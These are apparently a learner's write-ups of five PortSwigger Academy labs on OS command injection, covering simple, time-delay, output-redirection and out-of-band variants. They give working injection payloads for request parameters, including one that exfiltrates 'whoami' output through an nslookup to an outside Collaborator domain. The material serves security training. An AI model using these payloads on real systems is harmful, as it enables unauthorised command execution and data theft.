# OS command injection

## OS command injection, simple case

### Description

[This lab](https://portswigger.net/web-security/os-command-injection/lab-simple) contains an OS command injection vulnerability in the product stock checker: The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response. 

### Reproduction and proof of concept

1. Use Burp Suite to intercept and modify a request that checks the stock level. 
2. Modify the `storeID` parameter, giving it the value `1|whoami`. 
3. Observe that the response contains the name of the current user.

### Exploitability

An attacker will need to execute the `whoami` command to determine the name of the current user.

----

## Blind OS command injection with time delays

### Description

[This lab](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays) contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. 

### Reproduction and proof of concept

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the `email` parameter, changing it to: `email=x||ping+-c+10+127.0.0.1||`
3. Observe that the response takes 10 seconds to return.

### Exploitability

An attacker will need to exploit the blind OS command injection vulnerability to cause a 10 second delay. 

----

## Blind OS command injection with output redirection

### Description

[This lab](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection) contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

    /var/www/images/

The application serves the images for the product catalog from this location. It is possible to redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. 

### Reproduction and proof of concept

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to: `email=||whoami>/var/www/images/output.txt||`
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the filename parameter, changing the value to the name of the file specified for the output of the injected command: `filename=output.txt`
5. Observe that the response contains the output from the injected command.

### Exploitability

An attacker will need to execute the `whoami` command and retrieve the output. 

----

## Blind OS command injection with out-of-band interaction

### Description

[This lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band) contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that is accessible. However, it is possible to trigger out-of-band interactions with an external domain.

### Reproduction and proof of concept

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to: `email=x||nslookup+x.burp-collab-subdomain||`
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified email parameter.

### Exploitability

An attacker will need to exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. _Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator's default public server._

_Note: The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use Burp Collaborator client to verify that your payload had indeed triggered a DNS lookup. _

----

## Blind OS command injection with out-of-band data exfiltration

### Description

This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

### Reproduction and proof of concept

1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Collaborator tab.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard.
4. Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:

```
email=||nslookup+`whoami`.burp-collab-subdomain||
```
    
5. Go back to the Collaborator tab, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Collaborator tab. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.

### Exploitability

An attacker will need to execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator, and then enter the name of the current user to complete the lab. _Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, use Burp Collaborator's default public server (or a C2)._


